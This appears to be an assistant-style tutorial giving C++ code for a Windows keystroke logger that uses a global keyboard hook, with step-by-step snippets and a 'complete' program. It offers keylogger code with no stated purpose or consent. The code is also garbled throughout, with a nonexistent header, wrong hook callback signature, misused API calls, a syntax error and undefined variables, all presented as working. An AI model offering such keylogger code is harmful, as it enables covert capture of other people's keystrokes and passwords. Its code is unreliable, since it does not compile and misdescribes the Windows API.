To create a program that logs keyboard keystrokes on a Windows computer, you can use the Windows API to set up a keyboard hook. Here's a step-by-step guide to implementing this in C++:

### Step 1: Include Necessary Headers

Include the required headers for Windows API functions:

```c++
#include <windows.h>
#include <user32.h>
#include <iostream>
#include <iostream>
```

### Step 2: Define the Keyboard Hook Function

Define a function that will handle keyboard events:

```c++
void CALLBACK KeyPressed(int hInst, int nCode, struct HWND__*hwnd, struct KBDLLHOOKSTRUCT* lParam)
{
    // Handle keyboard events here
    // 'nCode' will be 0 for key down, 0x0001 for key up
    if (nCode == 0) // Key down
    {
        // Record the key press
        // Use GetKeyNameText to get the key name
        char keyBuffer[256];
        DWORD repeatCount = 0;
        GetKeyNameText(lParam, keyBuffer, sizeof(keyBuffer), &repeatCount);

        std::cout << "Key pressed: " << keyBuffer << std::endl;
    }
}
```

### Step 3: Set Up the Keyboard Hook

Set up the keyboard hook using `SetWindowsHook`:

```c++
int main()
{
    HHOOK hKeyboardHook = NULL;
    hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, KeyPressed);

    if (hKeyboardHook == NULL)
    {
        std::cout << "Failed to install keyboard hook" << std::endl;
        return 1;
    }

    // Run a loop to process events
    MSG msg;
    while (GetMessage(&msg, hInst, 0, 0)
    {
        if (msg.hwnd == hwnd) // Handle the event
        {
            if (msg.uMsg == WM_KEYDOWN)
            {
                // Handle key down event
            }
            else if (msg.uMsg == WM_KEYUP)
            {
                // Handle key up event
            }
        }
        TranslateMessage(&msg);
       DispatchMessage(&msg, hInst, msg.hwnd);
    }

    // Uninstall the hook
    UnhookWindowsHook(hKeyboardHook);
    return 0;
}
```

### Step 4: Complete the Code

Here's the complete code with error handling and a window:

```c++
#include <windows.h>
#include <user32.h>
#include <iostream>

using namespace std;

void CALLBACK KeyPressed(int hInst, int nCode, HWND hwnd, KBDLLHOOKSTRUCT* lParam)
{
    if (nCode == 0) // Key down event
    {
        char keyBuffer[256];
        DWORD repeatCount = 0;
        GetKeyNameText(lParam, keyBuffer, sizeof(keyBuffer), &repeatCount);
        cout << "Key pressed: " << keyBuffer << endl;
    }
}

int main()
{
    HHOOK hKeyboardHook = NULL;
    hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, KeyPressed);

    if (hKeyboardHook == NULL)
    {
        cout << "Failed to install keyboard hook." << endl;
        return 1;
    }

    HWND hwnd = CreateWindow("MyKeyboardHook", "Keyboard Hook", WS_OVERLAPPEDWINDOW | WS_VISIBLE, 0, 0, 0, 0, 0, HWND_DESKTOP, 0, 0, HWND_TOP, 0);
    if (hwnd == NULL)
    {
        cout << "Failed to create window." << endl;
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, hwnd, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(hwnd, msg);
    }

    UnhookWindowsHook(hKeyboardHook);
    DestroyWindow(hwnd);

    return 0;
}
```

